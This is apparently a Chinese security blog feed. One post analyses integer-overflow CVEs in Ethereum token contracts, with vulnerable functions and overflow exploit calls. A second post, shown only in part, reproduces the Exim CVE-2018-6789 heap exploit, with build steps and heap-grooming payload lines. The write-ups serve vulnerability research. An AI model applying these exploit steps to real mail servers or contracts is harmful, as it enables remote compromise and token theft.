<p>所以，<code>presaleSoldTokens &lt;= 60000000 * (1 ether / 1 wei)</code>，其中<code>1 ether / 1 wei = 1000000000000000000</code>，所以<code>max(presaleSoldTokens) == 6*(10^25)</code></p>
<p>再来看看变量<code>newTokens</code>，该变量的值取决于用户输出，是用户可控变量，相关代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">uint newTokens = msg.value * PRESALE_PRICE;</div><div class="line">uint public constant PRESALE_PRICE = 30000;</div></pre></td></tr></table></figure>
<p>如果我们向<code>buyTokensPresale</code>函数转账1 ether, <code>newTokens</code>的值为<code>1000000000000000000*30000=3*(10^22)</code></p>
<p>下面来计算一下，需要向该函数转账多少以太币，才能造成溢出</p>
<p>在以太坊智能合约中，<code>uint</code>默认代表的是<code>uint256</code>，取值范围是<code>0~2^256-1</code>，所以，需要<code>newTokens</code>的值大于<code>(2^256-1)-presaleSoldTokens</code>。</p>
<p>最后计算出，我们需要向<code>buyTokensPresale</code>函数转账:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; (2**256-1)-(6*(10**25))/(3*(10**22))</div><div class="line">115792089237316195423570985008687907853269984665640564039457584007913129637935L</div></pre></td></tr></table></figure>
<p>才可以造成整型上溢出，超额购币，整个以太坊公链，发展至今，以太币总余额有达到这个数吗？</p>
<p>虽然理论上该合约的确存在漏洞，但是实际却无法利用该漏洞</p>
<h2 id="2-CVE-2018-11810"><a href="#2-CVE-2018-11810" class="headerlink" title="2. CVE-2018-11810"></a>2. CVE-2018-11810</h2><p>该类漏洞被称为：“超额定向分配”</p>
<p>相关事例（ LGO ）源码：<a href="https://etherscan.io/address/0x123ab195dd38b1b40510d467a6a359b201af056f#code" target="_blank" rel="external">https://etherscan.io/address/0x123ab195dd38b1b40510d467a6a359b201af056f#code</a></p>
<p>根据该漏洞的描述：</p>
<blockquote>
<p>管理员绕过合约中规定的单地址发币上限，给指定地址分配超额的token</p>
</blockquote>
<p>跟上一个漏洞相比，因为该漏洞存在于<code>onlyOwner</code>的函数中，只能Owner(管理员)才能调用该漏洞，所以我认为该类漏洞可以算做是“后门“类漏洞。</p>
<p>所以该类漏洞的利用有两个思路：</p>
<ol>
<li>Owner留下来的“后门”，供自己使用，专门用来坑合约的其他使用者(所谓的”蜜罐合约“，就是这种情况)</li>
<li>该合约有其他漏洞，能让自己成为Owener，或者可以说，结合提权漏洞进行利用</li>
</ol>
<p>首先，我们先假设自己就是Owner，来研究该漏洞的利用流程，以下是存在漏洞的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">function allocate(address _address, uint256 _amount, uint8 _type) public onlyOwner returns (bool success) &#123;</div><div class="line">        // one allocations by address</div><div class="line">        require(allocations[_address] == 0);</div><div class="line"></div><div class="line">        if (_type == 0) &#123; // advisor</div><div class="line">            // check allocated amount</div><div class="line">            require(advisorsAllocatedAmount + _amount &lt;= ADVISORS_AMOUNT);</div><div class="line">            // increase allocated amount</div><div class="line">            advisorsAllocatedAmount += _amount;</div><div class="line">            // mark address as advisor</div><div class="line">            advisors[_address] = true;</div><div class="line">        &#125; else if (_type == 1) &#123; // founder</div><div class="line">            // check allocated amount</div><div class="line">            require(foundersAllocatedAmount + _amount &lt;= FOUNDERS_AMOUNT);</div><div class="line">            // increase allocated amount</div><div class="line">            foundersAllocatedAmount += _amount;</div><div class="line">            // mark address as founder</div><div class="line">            founders[_address] = true;</div><div class="line">        &#125; else &#123;</div><div class="line">            // check allocated amount</div><div class="line">            require(holdersAllocatedAmount + _amount &lt;= HOLDERS_AMOUNT + RESERVE_AMOUNT);</div><div class="line">            // increase allocated amount</div><div class="line">            holdersAllocatedAmount += _amount;</div><div class="line">        &#125;</div><div class="line">        // set allocation</div><div class="line">        allocations[_address] = _amount;</div><div class="line">        initialAllocations[_address] = _amount;</div><div class="line"></div><div class="line">        // increase balance</div><div class="line">        balances[_address] += _amount;</div><div class="line"></div><div class="line">        // update variables for bonus distribution</div><div class="line">        for (uint8 i = 0; i &lt; 4; i++) &#123;</div><div class="line">            // increase unspent amount</div><div class="line">            unspentAmounts[BONUS_DATES[i]] += _amount;</div><div class="line">            // initialize bonus eligibility</div><div class="line">            eligibleForBonus[BONUS_DATES[i]][_address] = true;</div><div class="line">            bonusNotDistributed[BONUS_DATES[i]][_address] = true;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        // add to initial holders list</div><div class="line">        initialHolders.push(_address);</div><div class="line"></div><div class="line">        Allocate(_address, _amount);</div><div class="line"></div><div class="line">        return true;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>该合约相当于一个代币分配的协议，Owner可以随意给人分配代币，但是不能超过如下的限制：</p>
<p>代币的总额: <code>uint256 constant INITIAL_AMOUNT  = 100 * onePercent;</code><br>给顾问5%: <code>uint256 constant ADVISORS_AMOUNT =   5 * onePercent;</code><br>创始人要15%: <code>uint256 constant FOUNDERS_AMOUNT =  15 * onePercent;</code><br>销售出了60%: <code>uint256 constant HOLDERS_AMOUNT  =  60 * onePercent;</code><br>保留了20%: <code>uint256 constant RESERVE_AMOUNT  =  20 * onePercent;</code></p>
<p>对应到下面三个判断：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">require(advisorsAllocatedAmount + _amount &lt;= ADVISORS_AMOUNT);</div><div class="line">require(foundersAllocatedAmount + _amount &lt;= FOUNDERS_AMOUNT);</div><div class="line">require(holdersAllocatedAmount + _amount &lt;= HOLDERS_AMOUNT + RESERVE_AMOUNT);</div></pre></td></tr></table></figure>
<p>跟上一个CVE一样，该漏洞本质上也是整型上溢出，但是上一个漏洞，用户可控的变量来至于向合约转账的以太币的数值，所以在实际情况中，基本不可能利用。但是在该漏洞中，用户可控的变量<code>_amount</code>，是由用户任意输入，使得该漏洞得以实现</p>
<p>下面，利用漏洞给顾问分配超过5%的代币：</p>
<ol>
<li>给顾问A分配<code>2*onePercent</code>数量的代币：<code>allocte(&quot;0xbd08e0cddec097db7901ea819a3d1fd9de8951a2&quot;, 362830104000000, 0)</code></li>
</ol>
<p><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/blockchain1.png?x-oss-process=style/blog_sy" alt="blockchain1"></p>
<ol>
<li><p>给顾问B分配一个巨大数量的代币，导致溢出：<code>allocte(&quot;0x63ac545c991243fa18aec41d4f6f598e555015dc&quot;, 115792089237316195423570985008687907853269984665640564039457583645083025639937, 0)</code></p>
</li>
<li><p>查看顾问B的代币数：<code>balanceOf(&quot;0x63ac545c991243fa18aec41d4f6f598e555015dc&quot;) =&gt; 115792089237316195423570985008687907853269984665640564039457583645083025639937</code></p>
</li>
</ol>
<p><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/blockchian2.png?x-oss-process=style/blog_sy" alt="blockchian2"></p>
<p>经过后续的审计，发现该合约代码中的<code>own</code>变量只能由Owner修改，所以该漏洞只能被Owner利用</p>
<h2 id="3-CVE-2018-11809"><a href="#3-CVE-2018-11809" class="headerlink" title="3. CVE-2018-11809"></a>3. CVE-2018-11809</h2><p>该漏洞被称为：”超额铸币“，但实际和之前的漏洞没啥区别</p>
<p>含有该漏洞的合约Playkey (PKT）源码：<a href="https://etherscan.io/address/0x2604fa406be957e542beb89e6754fcde6815e83f#code" target="_blank" rel="external">https://etherscan.io/address/0x2604fa406be957e542beb89e6754fcde6815e83f#code</a></p>
<p>存在漏洞的函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">function mint(address _holder, uint256 _value) external icoOnly &#123;</div><div class="line">  require(_holder != address(0));</div><div class="line">  require(_value != 0);</div><div class="line">  require(totalSupply + _value &lt;= tokenLimit);</div><div class="line"></div><div class="line">  balances[_holder] += _value;</div><div class="line">  totalSupply += _value;</div><div class="line">  Transfer(0x0, _holder, _value);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>比上一个漏洞的代码还更简单，只有ico(相当于之前的owner)能执行该函数，阅读全篇代码，ico是在合约部署的时候由创建人设置的，后续无法更改，所以该漏洞只能被ico(owner)利用</p>
<p>该合约本身的意图是，ico能随意给人分配代币，但是发行代币的总额度不能超过<code>tokenLimit</code>，但是通过整型上溢出漏洞，能让ico发行无限个代币，利用流程如下：</p>
<ol>
<li>部署合约，设置ico为自己账户地址，设置发行代币的上限为100000: <code>PTK(&quot;0x8a0b358029b81a52487acfc776fecca3ce2fbf4b&quot;, 100000)</code></li>
</ol>
<p><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/blockchain3.png?x-oss-process=style/blog_sy" alt="blockchain3"></p>
<ol>
<li>给账户A分配一定额度的代币: <code>mint(&quot;0xbd08e0cddec097db7901ea819a3d1fd9de8951a2&quot;, 50000)</code></li>
</ol>
<p><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/blockchain4.png?x-oss-process=style/blog_sy" alt="blockchain4"></p>
<ol>
<li>利用整型上溢出给账户B分配大量的代币: <code>mint(&quot;0x63ac545c991243fa18aec41d4f6f598e555015dc&quot;, 115792089237316195423570985008687907853269984665640564039457584007913129589938)</code></li>
<li>查看账户B的余额: <code>balanceOf(&quot;0x63ac545c991243fa18aec41d4f6f598e555015dc&quot;) =&gt; 115792089237316195423570985008687907853269984665640564039457584007913129589938</code></li>
</ol>
<p><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/blockchain5.png?x-oss-process=style/blog_sy" alt="blockchain5"></p>
<h2 id="4-CVE-2018-11812"><a href="#4-CVE-2018-11812" class="headerlink" title="4. CVE-2018-11812"></a>4. CVE-2018-11812</h2><p>该漏洞被称为：“随意铸币”</p>
<p>相关漏洞合约 Polymath (POLY)源码：<a href="https://etherscan.io/address/0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec#code" target="_blank" rel="external">https://etherscan.io/address/0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec#code</a></p>
<p>具有漏洞的函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">function mintToken(address target, uint256 mintedAmount) onlyOwner &#123;</div><div class="line">    balanceOf[target] += mintedAmount;</div><div class="line">    Transfer(0, owner, mintedAmount);</div><div class="line">    Transfer(owner, target, mintedAmount);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个漏洞很简单，也很好理解，Owner可以随意增加任意账户的代币余额，可以想象成，银行不仅能随心所欲的印钞票，还能随心所以的扣你的钱</p>
<p>因为Owner是在合约部署的时候被设置成合约部署者的账户地址，之后也只有Owner能修改Own账户地址，所以该漏洞只能被Owner利用</p>
<p>这个我觉得与其说是漏洞，不如说是Owner留下的“后门”</p>
<h2 id="5-CVE-2018-11687"><a href="#5-CVE-2018-11687" class="headerlink" title="5. CVE-2018-11687"></a>5. CVE-2018-11687</h2><p>该漏洞被称为：“下溢增持”</p>
<p>相关漏洞合约Bitcoin Red (BTCR)源码：<a href="https://etherscan.io/address/0x6aac8cb9861e42bf8259f5abdc6ae3ae89909e11#code" target="_blank" rel="external">https://etherscan.io/address/0x6aac8cb9861e42bf8259f5abdc6ae3ae89909e11#code</a></p>
<p>相关的漏洞函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">function distributeBTR(address[] addresses) onlyOwner &#123;</div><div class="line">    for (uint i = 0; i &lt; addresses.length; i++) &#123;</div><div class="line">        balances[owner] -= 2000 * 10**8;</div><div class="line">        balances[addresses[i]] += 2000 * 10**8;</div><div class="line">        Transfer(owner, addresses[i], 2000 * 10**8);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该合约限制了发行代币的上限: <code>uint256 _totalSupply = 21000000 * 10**8;</code></p>
<p>并且在合约部署的时候把能发行的合约都分配给了Owner: <code>balances[owner] = 21000000 * 10**8;</code></p>
<p>然后Owner可以把自己账户的代币，任意分配给其他账户，分配的代码就是上面的函数，给别人分配一定额度的代币时，自己减去相应额度的代币，保证该合约总代币数不变</p>
<p>但是因为没有判断Owner的账户是否有足够的余额，所以导致了减法的整型下溢出，同样也存在整型上溢出，但是因为uint256的上限是<code>2^256-1</code>，但是利用过于繁琐，需要运行非常多次的<code>balances[addresses[i]] += 2000 * 10**8;</code></p>
<p>而减法的利用就很简单了，或者我们可以根本不考虑这个减法，Owner可以给任意账户分配<code>2000 * 10**8</code>倍数的代币，该漏洞的功能和上一个漏洞的基本一致，可以任意发行代币或者减少其他账户的代币数</p>
<p>因为Owner是在合约部署的时候被设置为部署合约人的账户地址，后续没有修改own的功能，所以该漏洞也只有Owner可以利用</p>
<h2 id="6-CVE-2018-11811"><a href="#6-CVE-2018-11811" class="headerlink" title="6. CVE-2018-11811"></a>6. CVE-2018-11811</h2><p>该漏洞被称为：“高卖低收”</p>
<p>相关漏洞合约 Internet Node Token (INT)源码：<a href="https://etherscan.io/address/0x0b76544f6c413a555f309bf76260d1e02377c02a" target="_blank" rel="external">https://etherscan.io/address/0x0b76544f6c413a555f309bf76260d1e02377c02a</a></p>
<p>在该CVE的描述中，存在漏洞的函数是:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">function sell(uint256 amount) &#123;</div><div class="line">  require(this.balance &gt;= amount * sellPrice);      // checks if the contract has enough ether to buy</div><div class="line">  _transfer(msg.sender, this, amount);              // makes the transfers</div><div class="line">  msg.sender.transfer(amount * sellPrice);          // sends ether to the seller. It&apos;s important to do this last to avoid recursion attacks</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>并且描述的漏洞原理是: </p>
<blockquote>
<p>sellPrice被修改为精心构造的大数后，可导致amount * sellPrice的结果大于整数变量(uint256)最大值，发生整数溢出，从而变为一个极小值甚至归零`</p>
</blockquote>
<p>相关函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">function buy() payable &#123;</div><div class="line">  uint amount = msg.value / buyPrice;               // calculates the amount</div><div class="line">  _transfer(this, msg.sender, amount);              // makes the transfers</div><div class="line">&#125;</div><div class="line">  </div><div class="line">function setPrices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner &#123;</div><div class="line">  sellPrice = newSellPrice;</div><div class="line">  buyPrice = newBuyPrice;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该漏洞的利用流程如下：</p>
<ol>
<li>管理员设置<code>buyPrice = 1 ether</code>, <code>sellPrice = 2^255</code></li>
<li>用户A买了两个以太币价格的代币: buy({value:toWei(2)})</li>
<li>用户A卖掉两个代币: send(2)</li>
<li>用户A将会收到<code>2*sellPrice = 2^256</code>价格的Wei</li>
<li>但是因为<code>transfer</code>的参数是uint256, 所以发生了溢出，用户A实际得到0Wei</li>
</ol>
<p>表面上看这个漏洞还是有危害的，但是我们仔细想想，这个漏洞其实是比较多余的，我们可以使用更简单的步骤达到相同的目的:</p>
<ol>
<li>管理员设置<code>buyPrice = 1 ether</code>, <code>sellPrice = 0</code></li>
<li>用户A买了两个以太币价格的代币: buy({value:toWei(2)})</li>
<li>用户A卖掉两个代币: send(2)</li>
<li>用户A将会收到<code>2*sellPrice = 0</code>价格的Wei</li>
</ol>
<p>我认为该合约最大的问题在于Owner可以随意设置代币的买入和卖出价格。</p>
<p>顺带提一下这个问题也是前面peckshield公布的“tradeTrap”漏洞(<a href="https://peckshield.com/2018/06/11/tradeTrap/" target="_blank" rel="external">https://peckshield.com/2018/06/11/tradeTrap/</a>)提到的“Security Issue 2: Manipulatable Prices and Unfair Arbitrage” 是同一个问题。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过上面的分析，在这6个CVE中，虽然都是整型溢出，但第一个CVE属于理论存在，但实际不可实现的整型上溢出漏洞，剩下5个CVE都属于对管理者有利，会损害用户利用的漏洞，或者可以称为“后门”，也正是这个原因也导致了一些关于需要Owner触发漏洞意义讨论<a href="#jump2">[2]</a> </p>
<p>如果我们把智能合约类比为传统合同，智能合约代码就是传统合同的内容，但是和传统的合同相比，智能合约拥有三个利益团体，一个是编写合约代码的人(智能合约中的Owner，或者我们可以称为甲方)，使用该合约的其他人(我们可以称为乙方)，跟该智能合约无关的其他人(比如利用合约漏洞获利的黑客)。从这个角度来看Owner条件下触发的漏洞在理论上是可以损害到乙方的利益，如对于存在“恶意”的owner或者黑客配合其他漏洞获取到owner权限的场景上来说，还是有一定意义的。</p>
<p>另外从整个上市交易流程来看，我们还需要关注到“交易所”这个环节，交易所的风控体系在某种程度上可以限制这种“恶意”的owner或黑客利用。</p>
<p>由此可见合约审计对于“甲方”、“乙方”、交易所都有重要的意义。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><span id="jump1"><a href="https://www.anquanke.com/post/id/147913" target="_blank" rel="external">https://www.anquanke.com/post/id/147913</a></span></li>
<li><span id="jump2"><a href="https://mp.weixin.qq.com/s/6PKWXJXAKVCu5bJYlKy2Aw" target="_blank" rel="external">https://mp.weixin.qq.com/s/6PKWXJXAKVCu5bJYlKy2Aw</a></span></li>
</ol>
]]></content:encoded>
      
      <comments>//0x48.pw/2018/06/19/0x43/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Exim Off-by-one(CVE-2018-6789)漏洞复现分析</title>
      <link>//0x48.pw/2018/03/30/0x42/</link>
      <guid>//0x48.pw/2018/03/30/0x42/</guid>
      <pubDate>Fri, 30 Mar 2018 06:42:48 GMT</pubDate>
      <description>
      
        &lt;p&gt;前段时间meh又挖了一个Exim的RCE漏洞&lt;a href=&quot;#jump1&quot;&gt;[1]&lt;/a&gt;，而且这次RCE的漏洞的约束更少了，就算开启了PIE仍然能被利用。虽然去年我研究过Exim，但是时间过去这么久了，所以这次复现还是花了大量时间在熟悉Exim源码上。&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>前段时间meh又挖了一个Exim的RCE漏洞<a href="#jump1">[1]</a>，而且这次RCE的漏洞的约束更少了，就算开启了PIE仍然能被利用。虽然去年我研究过Exim，但是时间过去这么久了，所以这次复现还是花了大量时间在熟悉Exim源码上。</p>
<a id="more"></a>
<p>本次漏洞复现的过程中，踩了好多坑，实际复现的过程中发现堆块的实际情况无法像meh所说的那样的构造，所以在这部分卡了很久(猜测是因为环境不同的原因)，之后决定先理解meh利用的大致思路，然后自己根据实际情况对堆块进行构造，虽然过程艰难，但最终基本算是成功了。</p>
<h1 id="复现环境搭建"><a href="#复现环境搭建" class="headerlink" title="复现环境搭建"></a>复现环境搭建</h1><p>本次使用的环境和上次大致相同, 首先去github上该漏洞的patch commit<a href="#jump2">[2]</a></p>
<p>然后把分支切换到上一个commit</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ git <span class="built_in">clone</span> https://github.com/Exim/exim.git</div><div class="line">$ git checkout 38e3d2dff7982736f1e6833e06d4aab4652f337a</div><div class="line">$ <span class="built_in">cd</span> src</div><div class="line">$ mkdir Local</div></pre></td></tr></table></figure>
<p>Makefile仍然使用上次那个:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">$ cat Local/makefile | grep -v <span class="string">"#"</span></div><div class="line">BIN_DIRECTORY=/usr/exim/bin</div><div class="line">CONFIGURE_FILE=/usr/exim/configure</div><div class="line">EXIM_USER=ubuntu</div><div class="line">SPOOL_DIRECTORY=/var/spool/exim</div><div class="line">ROUTER_ACCEPT=yes</div><div class="line">ROUTER_DNSLOOKUP=yes</div><div class="line">ROUTER_IPLITERAL=yes</div><div class="line">ROUTER_MANUALROUTE=yes</div><div class="line">ROUTER_QUERYPROGRAM=yes</div><div class="line">ROUTER_REDIRECT=yes</div><div class="line">TRANSPORT_APPENDFILE=yes</div><div class="line">TRANSPORT_AUTOREPLY=yes</div><div class="line">TRANSPORT_PIPE=yes</div><div class="line">TRANSPORT_SMTP=yes</div><div class="line">LOOKUP_DBM=yes</div><div class="line">LOOKUP_LSEARCH=yes</div><div class="line">LOOKUP_DNSDB=yes</div><div class="line">PCRE_CONFIG=yes</div><div class="line">FIXED_NEVER_USERS=root</div><div class="line">AUTH_CRAM_MD5=yes</div><div class="line">AUTH_PLAINTEXT=yes</div><div class="line">AUTH_TLS=yes</div><div class="line">HEADERS_CHARSET=<span class="string">"ISO-8859-1"</span></div><div class="line">SUPPORT_TLS=yes</div><div class="line">TLS_LIBS=-lssl -lcrypto</div><div class="line">SYSLOG_LOG_PID=yes</div><div class="line">EXICYCLOG_MAX=10</div><div class="line">COMPRESS_COMMAND=/usr/bin/gzip</div><div class="line">COMPRESS_SUFFIX=gz</div><div class="line">ZCAT_COMMAND=/usr/bin/zcat</div><div class="line">SYSTEM_ALIASES_FILE=/etc/aliases</div><div class="line">EXIM_TMPDIR=<span class="string">"/tmp"</span></div></pre></td></tr></table></figure>
<p>然后就是编译安装了:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ make -j8</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure>
<p>启动也是跟上次一样，但是这里有一个坑点，开启debug，输出所有debug信息，不开debug，这些都堆的布局都会有影响。不过虽然有影响，但是只是影响构造的细节，总体的构造思路还是按照meh写的paper中那样。</p>
<p>本篇的复现，都是基于只输出部分debug信息的模式：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ /usr/exim/bin/exim -bdf -dd</div><div class="line"><span class="comment"># 输出完整debug信息使用的是-bdf -d+all</span></div><div class="line"><span class="comment"># 不开启debug模式使用的是-bdf</span></div></pre></td></tr></table></figure>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>因为我觉得meh的文章中，漏洞原理和相关函数的说明已经很详细，我也没啥要补充的，所以直接写我的复现过程</p>
<h2 id="STEP-1"><a href="#STEP-1" class="headerlink" title="STEP 1"></a>STEP 1</h2><p>首先需要构造一个被释放的chunk，但是没必要像meh文章说的是一个0x6060大小的chunk，只需要满足几个条件:</p>
<p><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/eximrce1.jpeg?x-oss-process=style/blog_sy" alt="eximrce1"></p>
<p>这个chunk要被分为三个部分，一个部分是通过<code>store_get</code>获取，用来存放base64解码的数据，用来造成<code>off by one</code>漏洞，覆盖下一个chunk的size，因为通过<code>store_get</code>获取的chunk最小值是0x2000，然后0x10的堆头和0x10的exim自己实现的堆头，所以是一个至少0x2020的堆块。</p>
<p>第二部分用来放<code>sender_host_name</code>，因为该变量的内存是通过<code>store_malloc</code>获取的，所以没有大小限制</p>
<p>第三部分因为需要构造一个fake chunk用来过free的检查，所以也是一个至少0x2020的堆块</p>
<p>和meh的方法不同，我通过<code>unrecognized command</code>来获取一个0x4041的堆块，然后通过<code>EHLO</code>来释放:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">p.sendline(<span class="string">"\x7f"</span>*<span class="number">4102</span>)</div><div class="line">p.sendline(<span class="string">"EHLO %s"</span>%(<span class="string">"c"</span>*(<span class="number">0x2010</span>)))</div><div class="line"><span class="comment"># heap</span></div><div class="line"><span class="number">0x1d15180</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x0</span>,</div><div class="line">  size = <span class="number">0x4041</span>,</div><div class="line">  fd = <span class="number">0x7f9520917b78</span>,</div><div class="line">  bk = <span class="number">0x1d1b1e0</span>,</div><div class="line">  fd_nextsize = <span class="number">0x0</span>,</div><div class="line">  bk_nextsize = <span class="number">0x0</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d191c0</span> &#123;</div><div class="line">  prev_size = <span class="number">0x4040</span>,</div><div class="line">  size = <span class="number">0x2020</span>,</div><div class="line">  fd = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk = <span class="number">0x6363636363636363</span>,</div><div class="line">  fd_nextsize = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk_nextsize = <span class="number">0x6363636363636363</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>0x1d15180是通过<code>unrecognized command</code>获取的一个0x4040大小的chunk，在执行完<code>EHLO</code>命令后被释放, 然后0x1d191c0是inuse的<code>sender_host_name</code>，这两部分就构成一个0x6060的chunk</p>
<h2 id="STEP-2"><a href="#STEP-2" class="headerlink" title="STEP 2"></a>STEP 2</h2><p>现在的情况是<code>sender_host_name</code>位于0x6060大小chunk的最底部，而我们需要把它移到中间</p>
<p>这部分的思路和meh的一样，首先通过<code>unrecognized command</code>占用顶部0x2020的chunk</p>
<p>之前的文章分析过，<code>unrecognized command</code>申请内存的大小是<code>ss = store_get(length + nonprintcount * 3 + 1);</code></p>
<p>通过计算，只需要让<code>length + nonprintcount * 3 + 1 &gt; yield_length</code>，<code>store_get</code>函数就会从malloc中申请一个chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">p.sendline(<span class="string">"\x7f"</span>*<span class="number">0x800</span>)</div></pre></td></tr></table></figure>
<p>这个时候我们就能使用<code>EHLO</code>释放之前的<code>sender_host_name</code>，然后重新设置，让<code>sender_host_name</code>位于0x6060大小chunk的中部</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">p.sendline(&quot;EHLO %s&quot;%(&quot;c&quot;*(0x2000-9)))</div><div class="line"># heap</div><div class="line">0x1d15180 PREV_INUSE &#123;</div><div class="line">  prev_size = 0x0,</div><div class="line">  size = 0x2021,</div><div class="line">  fd = 0x7f9520917b78,</div><div class="line">  bk = 0x1d191a0,</div><div class="line">  fd_nextsize = 0x0,</div><div class="line">  bk_nextsize = 0x0</div><div class="line">&#125;</div><div class="line">0x1d171a0 &#123;</div><div class="line">  prev_size = 0x2020,</div><div class="line">  size = 0x2000,</div><div class="line">  fd = 0x6363636363636363,</div><div class="line">  bk = 0x6363636363636363,</div><div class="line">  fd_nextsize = 0x6363636363636363,</div><div class="line">  bk_nextsize = 0x6363636363636363</div><div class="line">&#125;</div><div class="line">0x1d191a0 PREV_INUSE &#123;</div><div class="line">  prev_size = 0x63636363636363,</div><div class="line">  size = 0x6061,</div><div class="line">  fd = 0x1d15180,</div><div class="line">  bk = 0x7f9520917b78,</div><div class="line">  